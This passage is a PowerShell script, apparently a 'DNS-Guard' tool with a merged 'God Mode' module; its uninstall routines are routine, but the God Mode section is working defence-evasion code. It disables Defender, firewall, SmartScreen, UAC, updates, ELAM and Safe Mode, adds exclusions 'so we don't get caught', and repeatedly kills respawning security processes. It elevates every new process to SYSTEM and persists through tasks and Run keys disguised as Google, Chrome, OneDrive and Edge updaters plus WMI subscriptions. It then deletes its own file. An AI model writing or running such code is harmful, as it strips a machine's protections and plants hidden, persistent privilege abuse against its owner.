    if (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Guardian $GodModeGuardianName still exists." -Type "ERROR" -Color Red }
    if (Test-Path $GodModeInstallDir) { $FailedCount++; Write-Log -Message "Install dir $GodModeInstallDir still exists." -Type "ERROR" -Color Red }
    if (Test-Path $GodModeCmdPath) { $FailedCount++; Write-Log -Message "CLI $GodModeCmdPath still exists." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -like "*$GodModeInstallDir*") { $FailedCount++; Write-Log -Message "PATH still contains $GodModeInstallDir." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "`n[SUCCESS] GOD MODE UNINSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "`n[PARTIAL] UNINSTALLATION COMPLETE WITH ERRORS! ($FailedCount items failed)" -ForegroundColor Yellow
    }
}

function Uninstall-Persistence {
    # Exit early if nothing is installed
    $IsInstalled = (Test-Path $InstallDir) -or (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
    if (-not $IsInstalled) {
        Write-Host "[WARN] DNS-Guard is not installed. Nothing to uninstall." -ForegroundColor Yellow
        return
    }

    Write-Log -Message "Uninstalling DNS-Guard from System..." -Type "ACTION" -Color Yellow

    # GPO registry cleanup is handled by Disable-DNSLock; no separate ACL relaxation needed

    # Unlock the network FIRST (so it can safely write to the log file)
    Disable-DNSLock

    # Remove the Scheduled Tasks (including both guardians)
    $GuardianTaskName = "Windows-Defender-Platform-Update"
    $Guardian2Name = "Windows-Defender-AM-Updates"
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed Background Task: $TaskName" -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GuardianTaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed Guardian 1: $GuardianTaskName" -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $Guardian2Name -Confirm:$false | Out-Null
        Write-Log -Message "Removed Guardian 2: $Guardian2Name" -Type "INFO" -Color Gray
    }

    # Remove WMI Event Subscription
    Write-Log -Message "Removing WMI event subscription..." -Type "INFO" -Color Gray
    try {
        Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "__PATH LIKE '%WindowsUpdateHealthCheck%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove WMI subscription: $_" -Type "WARN" -Color Yellow }
    
    # Remove the integrity hash registry key
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (Test-Path $IntegrityRegPath) {
        Remove-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction SilentlyContinue
    }

    # Remove Global CLI Command (relax ACL first) - then delete via SYSTEM helper if needed
    if (Test-Path $CmdPath) {
        try {
            $CmdAcl = Get-Acl -Path $CmdPath
            $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
            $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($CurrentUserSid, "FullControl", "None", "None", "Allow")))
            Set-Acl -Path $CmdPath -AclObject $CmdAcl -ErrorAction Stop
            Remove-Item -Path $CmdPath -Force -ErrorAction Stop
        } catch {
            Write-Log -Message "Direct deletion failed for $CmdPath. Spawning SYSTEM cleanup task..." -Type "INFO" -Color Yellow
            Invoke-AsSystem -Command "takeown.exe /F $CmdPath; icacls.exe $CmdPath /reset; Remove-Item -Path $CmdPath -Force -ErrorAction Stop"
        }
        if (Test-Path $CmdPath) {
            Write-Log -Message "Failed to remove 'dnslock' CLI Alias at $CmdPath." -Type "ERROR" -Color Red
        } else {
            Write-Log -Message "Removed 'dnslock' CLI Alias." -Type "INFO" -Color Gray
        }
    }

    # Remove local wrapper and PATH entry
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    if (Test-Path $CmdPathLocal) { Remove-Item -Path $CmdPathLocal -Force -ErrorAction SilentlyContinue }
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -like "*$InstallDir*") {
            $NewPath = ($CurrentPath -split ';' | Where-Object { $_ -ne $InstallDir }) -join ';'
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Removed $InstallDir from system PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to clean system PATH: $_" -Type "ERROR" -Color Red
    }
    
    # Delete System Directory LAST - use SYSTEM helper if direct deletion fails (hardened ACLs)
    if (Test-Path $InstallDir) {
        Write-Log -Message "Removing hardened installation directory..." -Type "INFO" -Color Gray
        try {
            Remove-Item -Path $InstallDir -Recurse -Force -ErrorAction Stop
            Write-Log -Message "Installation directory removed." -Type "INFO" -Color Gray
        } catch {
            Write-Log -Message "Direct deletion failed (hardened ACLs). Spawning SYSTEM cleanup task..." -Type "INFO" -Color Yellow
            Invoke-AsSystem -Command "takeown.exe /F $InstallDir /R /D Y; icacls.exe $InstallDir /reset /T; Remove-Item -Path $InstallDir -Recurse -Force -ErrorAction Stop"
            Start-Sleep -Seconds 3
            if (Test-Path $InstallDir) {
                Write-Log -Message "SYSTEM cleanup failed: $InstallDir still exists." -Type "ERROR" -Color Red
                Write-Log -Message "[DEBUG] Directory contents: $(Get-ChildItem -Path $InstallDir -Force | Select-Object Name | Out-String)" -Type "ERROR" -Color Red
            } else {
                Write-Log -Message "Installation directory removed by SYSTEM. Goodbye!" -Type "INFO" -Color Gray
            }
        }
    }

    # Final status verification: check if any artifacts still remain
    $FailedCount = 0
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $TaskName still exists after uninstall." -Type "ERROR" -Color Red }
    if (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $GuardianTaskName still exists after uninstall." -Type "ERROR" -Color Red }
    if (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $Guardian2Name still exists after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $InstallDir) { $FailedCount++; Write-Log -Message "Install directory $InstallDir still exists after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $CmdPath) { $FailedCount++; Write-Log -Message "Global CLI $CmdPath still exists after uninstall." -Type "ERROR" -Color Red }
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    if (Test-Path $CmdPathLocal) { $FailedCount++; Write-Log -Message "Local wrapper $CmdPathLocal still exists after uninstall." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -like "*$InstallDir*") { $FailedCount++; Write-Log -Message "System PATH still contains $InstallDir after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $IntegrityRegPath) { Write-Log -Message "Registry key $IntegrityRegPath still exists after uninstall." -Type "WARN" -Color Yellow }
    $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if ($WmiFilter) { Write-Log -Message "WMI event filter still exists after uninstall." -Type "WARN" -Color Yellow }
    $WmiConsumer = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if ($WmiConsumer) { Write-Log -Message "WMI event consumer still exists after uninstall." -Type "WARN" -Color Yellow }

    if ($FailedCount -eq 0) {
        Write-Host "`n[SUCCESS] UNINSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "`n[PARTIAL] UNINSTALLATION COMPLETE WITH ERRORS! ($FailedCount items failed to remove)" -ForegroundColor Yellow
    }
}

# ============================================================================
# 7. GOD MODE MODULE (MERGED FROM God mode.ps1)
# ============================================================================
# WARNING: These functions disable Windows security features and are extremely
# dangerous. Only the Built-in Administrator account may use them.
# ============================================================================

function Test-BuiltInAdmin {
    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    return ($sid -like "*-500")
}

function Enable-DangerousMode {
    Write-Log -Message "Enabling dangerous mode..." -Type "WARN" -Color Yellow

    # 0. Add self to Defender exclusions BEFORE disabling it (so we don't get caught)
    Add-DefenderExclusion -Path $GodModeInstallDir
    Add-DefenderExclusion -Path $PSCommandPath

    # 1. Disable Tamper Protection (registry method, requires reboot on modern builds)
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Tamper Protection and Real-Time registry overrides applied." -Type "INFO" -Color Gray
    } catch {
        Write-Log -Message "Could not fully disable tamper protection via registry: $_" -Type "WARN" -Color Yellow
    }

    # 2. Disable core Windows Defender services at the service level
    $DefenderServices = @("WinDefend", "WdNisSvc", "WdBootDriver", "WdFilter", "WdNisDrv", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
    foreach ($svc in $DefenderServices) {
        try {
            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
            Write-Log -Message "Service $svc disabled and stopped." -Type "INFO" -Color Gray
        } catch { Write-Log -Message "Service $svc already down or inaccessible: $_" -Type "WARN" -Color Yellow }
    }

    # 3. Disable MpPreference settings (requires tamper protection off)
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
        Write-Log -Message "Windows Defender MpPreference settings disabled." -Type "INFO" -Color Gray
    } catch {
        Write-Log -Message "Error setting MpPreference: $_" -Type "WARN" -Color Yellow
    }

    # 4. Disable Firewall and SmartScreen
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Firewall disabled, SmartScreen disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error disabling firewall/smartscreen: $_" -Type "WARN" -Color Yellow }

    # 4a. Disable Safe Mode and Recovery to prevent removal
    Disable-RecoveryAndSafeMode

    # 4b. Suppress Security Center alerts
    Disable-SecurityAlerts

    # 4c. Disable Early Launch Anti-Malware
    Disable-ELAM

    # 5. Disable UAC / Admin Consent
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Force
        Write-Log -Message "UAC and Admin Consent prompts disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error disabling UAC: $_" -Type "WARN" -Color Yellow }

    # 6. Block Windows Update from re-enabling Defender
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-Service -Name "wuauserv" -StartupType Disabled -ErrorAction SilentlyContinue
        Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Windows Update service disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error disabling Windows Update: $_" -Type "WARN" -Color Yellow }

    # 7. Kill Defender processes
    try {
        Get-Process -Name MsMpEng, MsMpEngCP, smartscreen, SecurityHealthService, MpCmdRun, MsSense, MpDefenderCoreService -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Defender processes terminated." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error killing defender processes: $_" -Type "WARN" -Color Yellow }

    # 8. Disable event logging and clear tracks
    Disable-SecurityAuditing
}

function Disable-DangerousMode {
    Write-Log -Message "Disabling dangerous mode..." -Type "WARN" -Color Yellow

    # 1. Restore Tamper Protection registry
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring tamper protection registry: $_" -Type "WARN" -Color Yellow }

    # 2. Restore Defender services
    $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
    foreach ($svc in $DefenderServices) {
        try {
            Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
            Start-Service -Name $svc -ErrorAction SilentlyContinue
        } catch { Write-Log -Message "Could not restore service $svc`: $_" -Type "WARN" -Color Yellow }
    }

    # 3. Restore MpPreference
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
        Set-MpPreference -DisablePrivacyMode $false -ErrorAction SilentlyContinue
        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false -ErrorAction SilentlyContinue
        Set-MpPreference -DisableArchiveScanning $false -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIntrusionPreventionSystem $false -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring MpPreference: $_" -Type "WARN" -Color Yellow }

    # 4. Restore Firewall and SmartScreen
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $true -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring firewall/smartscreen: $_" -Type "WARN" -Color Yellow }

    # 5. Restore UAC
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 1 -Force
    } catch { Write-Log -Message "Error restoring UAC: $_" -Type "WARN" -Color Yellow }

    # 6. Restore Windows Update
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -ErrorAction SilentlyContinue
        Set-Service -Name "wuauserv" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name "wuauserv" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring Windows Update: $_" -Type "WARN" -Color Yellow }

    # 7. Restart WinDefend
    try { Start-Service -Name WinDefend -ErrorAction SilentlyContinue } catch { Write-Log -Message "Could not restart WinDefend: $_" -Type "WARN" -Color Yellow }

    # 8. Restore Safe Mode and Recovery
    try {
        bcdedit /deletevalue {current} safeboot /f 2>$null | Out-Null
        bcdedit /set {current} bootstatuspolicy displayallfailures /f 2>$null | Out-Null
        bcdedit /set {current} recoveryenabled Yes /f 2>$null | Out-Null
        bcdedit /set {current} nx OptIn /f 2>$null | Out-Null
        reagentc /enable 2>$null | Out-Null
        Write-Log -Message "Safe Mode and Windows RE restored." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "BCD restore failed: $_" -Type "WARN" -Color Yellow }

    # 9. Restore Security Center alerts
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -ErrorAction SilentlyContinue
    } catch {}

    # 10. Restore ELAM
    try {
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -ErrorAction SilentlyContinue
    } catch {}

    # 11. Restore event logging
    try {
        Set-Service -Name "EventLog" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name "EventLog" -ErrorAction SilentlyContinue
    } catch {}

    Write-Log -Message "Dangerous mode disable attempt complete. Reboot strongly recommended for full restoration." -Type "INFO" -Color Yellow
}

function Register-StealthTask {
    $taskName = $GodModeTaskPrefix + (Get-Random -Minimum 10000 -Maximum 99999)
    Unregister-StealthTask

    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"

    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
        -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
        -Principal $principal -Force | Out-Null
}

function Unregister-StealthTask {
    Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue |
        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
}

function Elevate-Process {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return }

    Write-Log -Message "Elevating: $Path" -Type "STEALTH" -Color Gray

    try {
        $action = New-ScheduledTaskAction -Execute $Path
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
            -LogonType ServiceAccount -RunLevel Highest
        $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)

        Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $tempTask
        Start-Sleep -Milliseconds 400
        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
    } catch {
        Write-Log -Message "Failed to elevate: $Path" -Type "ERROR" -Color Red
    }
}

function Start-Monitoring {
    if (-not (Test-Path $GodModeFlagFile)) {
        Write-Log -Message "God Mode is not enabled." -Type "ERROR" -Color Red
        return
    }

    # Hide from simple Task Manager view
    $Host.UI.RawUI.WindowTitle = "Windows PowerShell (x86)"
    try {
        $Proc = Get-Process -Id $PID
        $Proc.MainWindowTitle = "Windows PowerShell"
    } catch {}

    Write-Log -Message "Monitoring started with auto-recovery and resurrection killer." -Type "INFO"

    $lastElevated = @{}   # Process path -> last elevated time
    $lastKillCheck = [datetime]::MinValue

    while ($true) {
        try {
            Start-Sleep -Seconds 2

            # --- Resurrection Killer: Re-kill security services if they respawn (every 30 seconds) ---
            if ((Get-Date) - $lastKillCheck -gt [TimeSpan]::FromSeconds(30)) {
                $lastKillCheck = Get-Date
                $ServicesToKill = @("MsMpEng", "MsMpEngCP", "MpDefenderCoreService", "MsSense", "smartscreen", "SecurityHealthService", "MpCmdRun")
                foreach ($procName in $ServicesToKill) {
                    try {
                        Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
                    } catch { }
                }
                # Re-apply service-level disable if any service got re-enabled
                $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
                foreach ($svc in $DefenderServices) {
                    try {
                        $svcObj = Get-Service -Name $svc -ErrorAction SilentlyContinue
                        if ($svcObj -and $svcObj.Status -eq 'Running') {
                            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
                            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
                            Write-Log -Message "Resurrection killer: re-disabled $svc" -Type "INFO" -Color Gray
                        }
                    } catch { }
                }
            }

            # --- New Process Elevation ---
            $newProcesses = Get-WmiObject Win32_Process | Where-Object {
                $_.CreationDate -and 
                ([datetime]::ParseExact($_.CreationDate.Substring(0,14), "yyyyMMddHHmmss", $null)) -gt (Get-Date).AddSeconds(-10)
            }

            foreach ($proc in $newProcesses) {
                if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
                    $path = $proc.ExecutablePath

                    # Stronger duplicate prevention (60-second cooldown)
                    if (-not $lastElevated.ContainsKey($path) -or 
                        $lastElevated[$path] -lt (Get-Date).AddSeconds(-60)) {

                        $lastElevated[$path] = Get-Date
                        Elevate-Process $path
                    }
                }
            }
        }
        catch {
            Write-Log -Message "Monitoring error (recovering in 5s): $_" -Type "ERROR" -Color Red
            Start-Sleep -Seconds 5
        }
    }
}

function Enable-GodMode {
    "1" | Out-File $GodModeFlagFile -Force
    Register-StealthTask
    Enable-DangerousMode

    # --- Registry Persistence (Run keys) ---
    Write-Log -Message "Setting registry persistence keys..." -Type "INFO" -Color Gray
    $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ToggleOn"
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Registry persistence keys set." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to set registry persistence: $_" -Type "WARN" -Color Yellow }

    # --- Multi-layer task redundancy (backup task names) ---
    Write-Log -Message "Registering backup persistence tasks..." -Type "INFO" -Color Gray
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_")
    foreach ($Prefix in $BackupPrefixes) {
        try {
            $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ToggleOn"
            $trigger = New-ScheduledTaskTrigger -AtLogon
            $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
            Write-Log -Message "Backup task $taskName registered." -Type "INFO" -Color Gray
        } catch { Write-Log -Message "Backup task $Prefix failed: $_" -Type "WARN" -Color Yellow }
    }

    # --- Self-protection: harden flag file ---
    try {
        $FlagAcl = Get-Acl -Path $GodModeFlagFile -ErrorAction SilentlyContinue
        if ($FlagAcl) {
            $FlagAcl.SetAccessRuleProtection($true, $false)
            $FlagAcl.Access | ForEach-Object { $FlagAcl.RemoveAccessRule($_) | Out-Null }
            $FlagAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
            $FlagAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Read", "None", "None", "Allow")))
            Set-Acl -Path $GodModeFlagFile -AclObject $FlagAcl -ErrorAction SilentlyContinue
        }
    } catch { Write-Log -Message "Flag file self-protection failed: $_" -Type "WARN" -Color Yellow }

    # --- WMI persistence (file-less fallback) ---
    Register-GodModeWMI

    # --- Self-destruct: delete original script from disk after persistence is set ---
    Invoke-SelfDestruct -Path $PSCommandPath

    Write-Log -Message "God Mode ENABLED" -Type "WARN" -Color Yellow
}

function Disable-GodMode {
    Remove-Item $GodModeFlagFile -Force -ErrorAction SilentlyContinue
    Unregister-StealthTask

    # --- Remove backup task prefixes ---
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
    foreach ($Prefix in $BackupPrefixes) {
        try {
            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { }
    }

    # --- Remove registry persistence ---
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }

    Disable-DangerousMode

    # --- Cleanup WMI persistence ---
    try {
        $WmiName = "Win32ProviderHealthCheck"
        Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$WmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$WmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "__PATH LIKE '%$WmiName%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Write-Log -Message "WMI persistence removed." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "WMI cleanup failed: $_" -Type "WARN" -Color Yellow }

    Write-Log -Message "God Mode DISABLED" -Type "WARN" -Color Yellow
}

function Show-GodModeStatus {
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " GOD MODE STATUS DETAIL                    " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

    # Core God Mode state
    if (Test-Path $GodModeFlagFile) {
        Write-Host "  God Mode State          : ACTIVE" -ForegroundColor Red
    } else {
        Write-Host "  God Mode State          : INACTIVE" -ForegroundColor Green
    }

    # Stealth task status
    $StealthTasks = Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue
    if ($StealthTasks) {
        Write-Host "  Stealth Task            : INSTALLED ($($StealthTasks.Count) found)" -ForegroundColor Cyan
    } else {
        Write-Host "  Stealth Task            : NOT INSTALLED" -ForegroundColor DarkGray
    }

    # Defender processes
    $DefenderProcs = @("MsMpEng", "MsMpEngCP", "MpDefenderCoreService", "MsSense", "smartscreen", "SecurityHealthService")
    $RunningDefender = 0
    foreach ($proc in $DefenderProcs) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) { $RunningDefender++ }
    }
    if ($RunningDefender -eq 0) {
        Write-Host "  Defender Processes      : ALL STOPPED ($RunningDefender/$($DefenderProcs.Count))" -ForegroundColor Green
    } else {
        Write-Host "  Defender Processes      : $RunningDefender RUNNING ($($DefenderProcs.Count) total)" -ForegroundColor Red
    }

    # Defender services
    $DefenderSvcs = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
    $RunningSvcs = 0
    foreach ($svc in $DefenderSvcs) {
        $svcObj = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($svcObj -and $svcObj.Status -eq 'Running') { $RunningSvcs++ }
    }
    if ($RunningSvcs -eq 0) {
        Write-Host "  Defender Services       : ALL STOPPED ($RunningSvcs/$($DefenderSvcs.Count))" -ForegroundColor Green
    } else {
